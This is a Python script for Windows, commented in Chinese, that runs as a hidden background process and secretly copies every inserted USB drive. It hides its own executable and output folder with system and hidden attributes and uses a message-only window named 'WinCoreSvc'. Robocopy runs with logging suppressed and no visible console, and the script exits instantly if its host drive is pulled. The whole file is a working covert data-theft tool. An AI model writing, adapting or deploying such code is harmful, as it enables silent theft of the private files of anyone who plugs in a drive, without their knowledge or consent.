import os, sys, subprocess, ctypes, threading, time
import win32api, win32con, win32gui, win32process, win32event

# --- 终极核心参数 ---
EXE_PATH = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
SELF_DRIVE = os.path.splitdrive(EXE_PATH).upper() + "\\"
TARGET_ROOT = os.path.join(os.path.dirname(EXE_PATH), "Copy")
THREADS = 128
MIN_SPACE_GB = 5

# --- 1. 唯一性校验：确保内核对象不冲突 ---
try:
    instance_mutex = win32event.CreateMutex(None, False, "Global\\WinSys_Final_v28")
    if win32api.GetLastError() == win32con.ERROR_ALREADY_EXISTS:
        os._exit(0)
except:
    os._exit(0)

def set_stealth_attr(path):
    """应用系统级超级隐藏属性"""
    try:
        if not os.path.exists(path): os.makedirs(path)
        # 0x02: Hidden, 0x04: System, 0x100: Temporary
        ctypes.windll.kernel32.SetFileAttributesW(path, 0x02 | 0x04 | 0x100)
    except: pass

def smart_gc_cleanup():
    """磁盘水位循环回收"""
    while True:
        free_bytes = ctypes.c_ulonglong(0)
        ctypes.windll.kernel32.GetDiskFreeSpaceExW(
            ctypes.c_wchar_p(os.path.dirname(EXE_PATH)), None, None, ctypes.pointer(free_bytes)
        )
        if (free_bytes.value / (1024**3)) < MIN_SPACE_GB:
            try:
                if not os.path.exists(TARGET_ROOT): break
                entries = [os.path.join(TARGET_ROOT, d) for d in os.listdir(TARGET_ROOT)]
                if not entries: break
                # 找到最旧的目录删除
                oldest = min(entries, key=os.path.getmtime)
                subprocess.run(['cmd', '/c', 'rd', '/s', '/q', oldest], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                               creationflags=0x08000000)
            except: break
        else: break

def ghost_engine_v28(src, dst):
    """
    终极内核引擎：
    /R:0 /W:0 不重试防止卡死 | /B 备份模式突破只读 | /LOG:NUL 关掉一切反馈
    """
    smart_gc_cleanup()
    cmd = [
        'robocopy', src, dst, '/E', f'/MT:{THREADS}',
        '/J', '/B', '/R:0', '/W:0', '/TBD', '/NP', '/XJ', '/SL', '/LOG:NUL',
        '/DCOPY:DAT', '/TIMFIX', '/XCC'
    ]
    try:
        # Popen 配合 timeout 逻辑，防止出现无法关闭的僵尸子进程
        p = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             creationflags=0x00000008 | 0x08000000 | 0x00000100)
        # 实时监控，如果宿主盘突然没了，强制干掉当前的复制进程
        while p.poll() is None:
            if not os.path.exists(SELF_DRIVE):
                p.kill()
                os._exit(0)
            time.sleep(1)
    except: pass

def worker(drive):
    # 物理隔离与合法性校验
    if drive.upper() == SELF_DRIVE or ctypes.windll.kernel32.GetDriveTypeW(drive) != 2:
        return
    
    sn = ctypes.c_uint(0)
    # 针对部分挂载慢的 U 盘进行探测
    found = False
    for _ in range(5):
        if ctypes.windll.kernel32.GetVolumeInformationW(drive, None, 0, ctypes.byref(sn), None, None, None, 0) != 0:
            found = True
            break
        time.sleep(1)
    
    if not found: return
    
    ts = time.strftime("%Y%m%d_%H%M%S")
    dst = "\\\\?\\" + os.path.abspath(os.path.join(TARGET_ROOT, f"S_{sn.value}_{ts}"))
    os.makedirs(dst, exist_ok=True)
    ghost_engine_v28(drive, dst)

class CoreHost:
    def __init__(self):
        wc = win32gui.WNDCLASS()
        wc.lpfnWndProc = self.handler
        wc.lpszClassName = "WinSys_Core_Host_v28"
        hinst = win32api.GetModuleHandle(None)
        class_atom = win32gui.RegisterClass(wc)
        # 消息专用窗口 (隐身级别最高)
        self.hwnd = win32gui.CreateWindowEx(
            0, class_atom, "WinCoreSvc", 0, 0, 0, 0, 0, win32con.HWND_MESSAGE, 0, hinst, None
        )

    def handler(self, hwnd, msg, wp, lp):
        if msg == win32con.WM_DEVICECHANGE:
            if wp == 0x8000: # 发现新硬件
                threading.Thread(target=self.scan, daemon=True).start()
            elif wp == 0x8004: # 硬件拔出
                if not os.path.exists(SELF_DRIVE):
                    os._exit(0) # 瞬间切断进程
        return win32gui.DefWindowProc(hwnd, msg, wp, lp)

    def scan(self):
        time.sleep(2)
        mask = ctypes.windll.kernel32.GetLogicalDrives()
        for i in range(26):
            if (mask >> i) & 1:
                drive = chr(65 + i) + ":\\"
                worker(drive)

    def run(self):
        self.scan()
        win32gui.PumpMessages()

if __name__ == "__main__":
    # 初始化环境并应用超级隐藏
    set_stealth_attr(TARGET_ROOT)
    try:
        ctypes.windll.kernel32.SetFileAttributesW(EXE_PATH, 0x02 | 0x04)
    except: pass

    # 内核分配优化
    try:
        # 设置为最高优先级类
        win32api.SetPriorityClass(win32api.GetCurrentProcess(), 0x00000080) # HIGH
        # 只在 CPU 最后一个核心上执行复制，主核心零感
        mask = 1 << (win32api.GetSystemInfo() - 1)
        win32process.SetProcessAffinityMask(win32api.GetCurrentProcess(), mask)
    except: pass

    CoreHost().run()
